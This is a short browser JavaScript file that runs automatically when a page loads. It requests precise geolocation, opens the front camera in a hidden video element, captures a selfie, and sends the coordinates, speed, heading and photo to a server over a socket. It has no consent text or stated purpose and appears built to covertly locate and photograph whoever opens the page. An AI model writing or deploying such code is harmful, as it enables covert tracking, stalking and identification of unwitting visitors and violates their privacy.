const socket = io();

async function captureSelfieAndSendLocation() {
  if (!navigator.geolocation) {
    alert("Geolocation is not supported by your browser.");
    return;
  }

  // 1. Get location
  navigator.geolocation.getCurrentPosition(async (position) => {
    // 2. Capture selfie (front camera)
    const constraints = { video: { facingMode: "user" } };
    const video = document.createElement('video');
    video.setAttribute('autoplay', '');
    video.setAttribute('playsinline', '');
    video.style.display = 'none';
    document.body.appendChild(video);

    let stream = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia(constraints);
      video.srcObject = stream;
      await new Promise(resolve => video.onloadedmetadata = resolve);
      await new Promise(r => setTimeout(r, 500)); // let camera adjust

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      const selfie = canvas.toDataURL('image/jpeg', 0.85);

      stream.getTracks().forEach(track => track.stop());
      video.remove();

      // 3. Prepare and send data
      const data = {
        lat: position.coords.latitude.toFixed(8),
        lng: position.coords.longitude.toFixed(8),
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        speed: position.coords.speed,
        heading: position.coords.heading,
        time: new Date().toISOString(),
        selfie
      };
      socket.emit('send-location', data);
    } catch (err) {
      if (stream) stream.getTracks().forEach(track => track.stop());
      video.remove();
      alert('Camera error: ' + err.message);
    }
  }, (error) => {
    alert('Location permission denied or error: ' + error.message);
  }, {
    enableHighAccuracy: true,
    maximumAge: 0,
    timeout: 10000
  });
}

// Auto-run on page load
window.addEventListener('DOMContentLoaded', captureSelfieAndSendLocation);